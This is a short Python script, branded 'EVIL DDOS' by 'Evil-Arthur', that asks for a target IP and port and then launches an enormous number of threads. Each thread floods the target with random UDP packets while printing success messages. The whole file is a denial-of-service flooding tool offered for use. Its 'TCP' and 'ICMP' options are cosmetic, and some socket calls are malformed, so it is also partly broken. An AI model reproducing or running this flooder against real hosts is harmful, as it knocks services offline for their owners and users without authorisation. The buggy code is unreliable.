#import pyfiglet
import random
import time
import socket
import threading
from time import sleep
import os
os.system("clear")

R = '\033[1;31m'
Y = '\033[1;33m'
R1 = '\033[2;31m'
G1 = '\033[2;32m'
C1 = '\033[2;34m'
P1 = '\033[2;35m'
C = '\033[2;36m'
B = '\033[1;34m'
W = '\033[1;37m'
G = '\033[1;92m'

#----- (LOGO) -----

print (G1 +'''
------------------------------------------------------------
|  _______     _____ _       ____    ____     ___    ____   |
| | ____\ \   / /_ _| |     |  _ \  |  _ \   / _ \  / ___|  |
| |  _|  \ \ / / | || |     | | | | | | | | | | | | \___ \  |
| | |___  \ V /  | || |___  | |_| | | |_| | | |_| |  ___) | |
| |_____|  \_/  |___|_____| |____/  |____/   \___/  |____/  |
|       						    |
------------------------------------------------------------

	\033[1;37m -| Created By \033[1;92mEvil-Arthur
''')

s_d = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = (input(f'{G}Website IP : '))
port = int(input(f'{G}Port : '))
print(f'{Y}loding...')
try:
    s_d.connect((ip, port))
except:
    print(f'{R1} Error {G}< Error 404 >')
    exit()

time.sleep(1)

def random_packet_type():
    packet_types = ["TCP", "UDP", "ICMP"]
    return random.choice(packet_types)

def attack():
    for i in range(1, 100000000):
        packet_type = random_packet_type()
        if packet_type == "TCP":
            s_d.send(bytes(random._urandom(10)), (ip, port))
        elif packet_type == "UDP":
            s_d.sendto(bytes(random._urandom(10)), (ip, port))
        elif packet_type == "ICMP":
            s_d.sendall(bytes(random._urandom(10)), (ip, port))
        try:
            print(f'{G}Sent : {C} {B}< Target : {R} {ip} , {Y} port : {port} Successo >')
            time.sleep(0)
        except:
            print(f'{R1} Error {G}< Error >')
            pass

for i in range(1*100000000000000000000000000000000000):
    thread = threading.Thread(target=attack)
    thread.start()
